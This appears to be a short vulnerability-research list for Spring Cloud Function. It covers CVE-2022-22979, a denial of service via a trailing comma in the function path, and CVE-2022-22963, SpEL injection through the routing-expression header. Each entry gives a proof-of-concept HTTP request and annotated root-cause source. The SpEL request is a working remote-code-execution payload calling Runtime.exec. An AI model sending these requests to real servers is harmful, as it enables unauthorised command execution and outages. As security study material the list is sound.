# SpringSecurity
A list for Spring Security

## Spring Cloud Function
### CVE-2022-22979 DoS
Affected Version: < 3.2.6  
Ref: https://checkmarx.com/blog/spring-function-cloud-dos-cve-2022-22979-and-unintended-function-invocation/  
POC: 
```
POST /uppercase, HTTP/1.1

{'a':1}
```
Factor: 
```
BeanFactoryAwareFunctionRegistry
public <T> T lookup(Class<?> type, String functionDefinition, String... expectedOutputMimeTypes) {
    functionDefinition = StringUtils.hasText(functionDefinition) ? functionDefinition : this.applicationContext.getEnvironment().getProperty("spring.cloud.function.definition", ""); // get uri -> "uppercase,"
    functionDefinition = this.normalizeFunctionDefinition(functionDefinition); // Replace , with |, -> "uppercase|"
    ...
    FunctionInvocationWrapper function = (FunctionInvocationWrapper)this.doLookup(type, functionDefinition, expectedOutputMimeTypes);// (1)function=wrappedFunctionDefinitions.get(functionDefinition); (2)if(function==null){"uppercase|" -> ["uppercase", ""]，遍历数组从Function注册表中寻找对应值，找到了就将Function存放于wrappedFunctionDefinitions，没找到就返回空}
    if (function == null) {
      ...
      this.register(functionRegistration);// SimpleFunctionRegistry.register
    }
}

SimpleFunctionRegistry
public <T> void register(FunctionRegistration<T> registration) {
    this.functionRegistrations.add(registration); //将funtion注册在funtionRegistrations中，它是CopyOnWriteArraySet类型，随着size无限增大造成DoS
}
```
### CVE-2022-22963 SpEL
Affected Version: <= 3.1.6, 3.2.2   
POC: 
```
POST /functionRouter HTTP/1.1
spring.cloud.function.routing-expression: T(java.lang.Runtime).getRuntime().exec("open -a Calculator")

aaa
```
Factor: 
```
RoutingFunction
private Object route(Object input, boolean originalInputIsPublisher) {
    Function function;
    if (input instanceof Message) {
        if (StringUtils.hasText((String)message.getHeaders().get("spring.cloud.function.definition"))) {...}
        else if (StringUtils.hasText((String)message.getHeaders().get("spring.cloud.function.routing-expression"))) {
            function = this.functionFromExpression((String)message.getHeaders().get("spring.cloud.function.routing-expression"), message);
            ...
        }...
}

private final StandardEvaluationContext evalContext = new StandardEvaluationContext();

private Function functionFromExpression(String routingExpression, Object input) {
    Expression expression = this.spelParser.parseExpression(routingExpression);
    String functionName = (String)expression.getValue(this.evalContext, input, String.class);
    ...
}
```
